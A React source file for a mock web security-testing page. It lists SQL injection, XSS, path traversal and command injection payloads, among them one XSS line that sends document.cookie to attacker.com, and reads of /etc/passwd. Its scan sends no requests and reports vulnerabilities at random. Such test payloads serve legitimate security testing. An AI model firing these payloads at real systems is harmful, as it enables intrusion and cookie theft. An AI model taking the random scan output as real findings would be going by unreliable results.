import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Shield, AlertTriangle, CheckCircle, XCircle, Play, Download } from "lucide-react";
import { toast } from "sonner";

interface TestResult {
  type: string;
  payload: string;
  vulnerable: boolean;
  severity: "low" | "medium" | "high" | "critical";
  description: string;
}

export default function SecurityTesting() {
  const [targetUrl, setTargetUrl] = useState("");
  const [testType, setTestType] = useState<string>("sql-injection");
  const [customPayload, setCustomPayload] = useState("");
  const [results, setResults] = useState<TestResult[]>([]);
  const [isScanning, setIsScanning] = useState(false);

  const sqlInjectionPayloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL, NULL--",
    "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
    "1' AND SLEEP(5)--",
    "1' WAITFOR DELAY '0:0:5'--",
  ];

  const xssPayloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
  ];

  const pathTraversalPayloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
  ];

  const commandInjectionPayloads = [
    "; ls -la",
    "| ls -la",
    "& dir",
    "&& dir",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
  ];

  const runSecurityScan = async () => {
    if (!targetUrl.trim()) {
      toast.error("Please enter a target URL");
      return;
    }

    setIsScanning(true);
    setResults([]);

    try {
      let payloads: string[] = [];
      let testName = "";

      switch (testType) {
        case "sql-injection":
          payloads = sqlInjectionPayloads;
          testName = "SQL Injection";
          break;
        case "xss":
          payloads = xssPayloads;
          testName = "Cross-Site Scripting (XSS)";
          break;
        case "path-traversal":
          payloads = pathTraversalPayloads;
          testName = "Path Traversal";
          break;
        case "command-injection":
          payloads = commandInjectionPayloads;
          testName = "Command Injection";
          break;
        case "custom":
          if (!customPayload.trim()) {
            toast.error("Please enter a custom payload");
            setIsScanning(false);
            return;
          }
          payloads = [customPayload];
          testName = "Custom Payload";
          break;
      }

      // Simulate security testing (in real implementation, this would make actual requests)
      const testResults: TestResult[] = [];

      for (const payload of payloads) {
        await new Promise(resolve => setTimeout(resolve, 200)); // Simulate delay

        // Simulate vulnerability detection (random for demo)
        const vulnerable = Math.random() > 0.7;
        const severity = vulnerable 
          ? (["low", "medium", "high", "critical"][Math.floor(Math.random() * 4)] as TestResult["severity"])
          : "low";

        testResults.push({
          type: testName,
          payload,
          vulnerable,
          severity,
          description: vulnerable 
            ? `Potential vulnerability detected with payload: ${payload.substring(0, 50)}...`
            : `No vulnerability detected with payload: ${payload.substring(0, 50)}...`
        });
      }

      setResults(testResults);
      
      const vulnerableCount = testResults.filter(r => r.vulnerable).length;
      if (vulnerableCount > 0) {
        toast.error(`Found ${vulnerableCount} potential vulnerabilities!`);
      } else {
        toast.success("No vulnerabilities detected in this scan");
      }
    } catch (error) {
      toast.error("Security scan failed");
      console.error(error);
    } finally {
      setIsScanning(false);
    }
  };

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical": return "bg-red-600";
      case "high": return "bg-orange-600";
      case "medium": return "bg-yellow-600";
      case "low": return "bg-blue-600";
      default: return "bg-gray-600";
    }
  };

  const exportResults = () => {
    const report = {
      target: targetUrl,
      testType,
      timestamp: new Date().toISOString(),
      results: results.map(r => ({
        type: r.type,
        payload: r.payload,
        vulnerable: r.vulnerable,
        severity: r.severity,
        description: r.description
      }))
    };

    const blob = new Blob([JSON.stringify(report, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `security-scan-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
    toast.success("Security report exported!");
  };

  return (
    <div className="container py-8">
      <div className="mb-8">
        <h1 className="text-3xl font-bold tracking-tight mb-2 flex items-center gap-2">
          <Shield className="h-8 w-8" />
          Security Testing
        </h1>
        <p className="text-muted-foreground">
          Test your applications for SQL injection, XSS, CSRF, and other security vulnerabilities
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Configuration Panel */}
        <Card className="lg:col-span-1">
          <CardHeader>
            <CardTitle>Test Configuration</CardTitle>
            <CardDescription>Configure your security scan</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <label className="text-sm font-medium">Target URL</label>
              <Input
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder="https://example.com/api/endpoint"
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium">Test Type</label>
              <Select value={testType} onValueChange={setTestType}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="sql-injection">SQL Injection</SelectItem>
                  <SelectItem value="xss">Cross-Site Scripting (XSS)</SelectItem>
                  <SelectItem value="path-traversal">Path Traversal</SelectItem>
                  <SelectItem value="command-injection">Command Injection</SelectItem>
                  <SelectItem value="custom">Custom Payload</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {testType === "custom" && (
              <div className="space-y-2">
                <label className="text-sm font-medium">Custom Payload</label>
                <Textarea
                  value={customPayload}
                  onChange={(e) => setCustomPayload(e.target.value)}
                  placeholder="Enter your custom payload..."
                  className="min-h-[100px] font-mono text-sm"
                />
              </div>
            )}

            <Button 
              onClick={runSecurityScan} 
              className="w-full" 
              size="lg"
              disabled={isScanning}
            >
              <Play className="h-4 w-4 mr-2" />
              {isScanning ? "Scanning..." : "Run Security Scan"}
            </Button>

            {results.length > 0 && (
              <Button 
                onClick={exportResults} 
                variant="outline" 
                className="w-full"
              >
                <Download className="h-4 w-4 mr-2" />
                Export Report
              </Button>
            )}
          </CardContent>
        </Card>

        {/* Results Panel */}
        <Card className="lg:col-span-2">
          <CardHeader>
            <CardTitle>Scan Results</CardTitle>
            <CardDescription>
              {results.length > 0 
                ? `${results.filter(r => r.vulnerable).length} vulnerabilities found out of ${results.length} tests`
                : "Results will appear here after scanning"}
            </CardDescription>
          </CardHeader>
          <CardContent>
            {results.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-12 text-center">
                <Shield className="h-16 w-16 text-muted-foreground mb-4" />
                <p className="text-muted-foreground">
                  No scan results yet. Configure and run a security scan to see results.
                </p>
              </div>
            ) : (
              <div className="space-y-3 max-h-[600px] overflow-y-auto">
                {results.map((result, index) => (
                  <div
                    key={index}
                    className={`p-4 rounded-lg border ${
                      result.vulnerable 
                        ? "border-red-500/50 bg-red-500/5" 
                        : "border-green-500/50 bg-green-500/5"
                    }`}
                  >
                    <div className="flex items-start justify-between mb-2">
                      <div className="flex items-center gap-2">
                        {result.vulnerable ? (
                          <XCircle className="h-5 w-5 text-red-500" />
                        ) : (
                          <CheckCircle className="h-5 w-5 text-green-500" />
                        )}
                        <span className="font-medium">{result.type}</span>
                      </div>
                      {result.vulnerable && (
                        <Badge className={getSeverityColor(result.severity)}>
                          {result.severity.toUpperCase()}
                        </Badge>
                      )}
                    </div>
                    <p className="text-sm text-muted-foreground mb-2">{result.description}</p>
                    <div className="bg-muted p-2 rounded text-xs font-mono overflow-x-auto">
                      {result.payload}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Information Tabs */}
      <Card className="mt-6">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <AlertTriangle className="h-5 w-5" />
            Security Testing Information
          </CardTitle>
        </CardHeader>
        <CardContent>
          <Tabs defaultValue="sql">
            <TabsList>
              <TabsTrigger value="sql">SQL Injection</TabsTrigger>
              <TabsTrigger value="xss">XSS</TabsTrigger>
              <TabsTrigger value="csrf">CSRF</TabsTrigger>
              <TabsTrigger value="best-practices">Best Practices</TabsTrigger>
            </TabsList>
            <TabsContent value="sql" className="space-y-2">
              <h3 className="font-semibold">SQL Injection Testing</h3>
              <p className="text-sm text-muted-foreground">
                SQL injection is a code injection technique that exploits security vulnerabilities in an application's database layer.
                This tool tests for various types of SQL injection including:
              </p>
              <ul className="list-disc list-inside text-sm text-muted-foreground space-y-1">
                <li><strong>Union-based:</strong> Uses UNION SQL operator to combine results</li>
                <li><strong>Error-based:</strong> Forces database to generate error messages</li>
                <li><strong>Blind:</strong> Asks true/false questions to the database</li>
                <li><strong>Time-based:</strong> Uses database delays to infer information</li>
              </ul>
            </TabsContent>
            <TabsContent value="xss" className="space-y-2">
              <h3 className="font-semibold">Cross-Site Scripting (XSS)</h3>
              <p className="text-sm text-muted-foreground">
                XSS attacks inject malicious scripts into trusted websites. This tool tests for:
              </p>
              <ul className="list-disc list-inside text-sm text-muted-foreground space-y-1">
                <li><strong>Reflected XSS:</strong> Script is reflected off the web server</li>
                <li><strong>Stored XSS:</strong> Script is permanently stored on target servers</li>
                <li><strong>DOM-based XSS:</strong> Vulnerability exists in client-side code</li>
              </ul>
            </TabsContent>
            <TabsContent value="csrf" className="space-y-2">
              <h3 className="font-semibold">Cross-Site Request Forgery (CSRF)</h3>
              <p className="text-sm text-muted-foreground">
                CSRF attacks force authenticated users to submit requests they didn't intend to make.
                Protection methods include CSRF tokens, SameSite cookies, and checking Origin/Referer headers.
              </p>
            </TabsContent>
            <TabsContent value="best-practices" className="space-y-2">
              <h3 className="font-semibold">Security Testing Best Practices</h3>
              <ul className="list-disc list-inside text-sm text-muted-foreground space-y-1">
                <li>Always get written permission before testing third-party systems</li>
                <li>Test in isolated environments when possible</li>
                <li>Document all findings with severity levels</li>
                <li>Follow responsible disclosure practices</li>
                <li>Combine automated testing with manual review</li>
                <li>Keep payload libraries up-to-date</li>
                <li>Test both authenticated and unauthenticated endpoints</li>
              </ul>
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
}
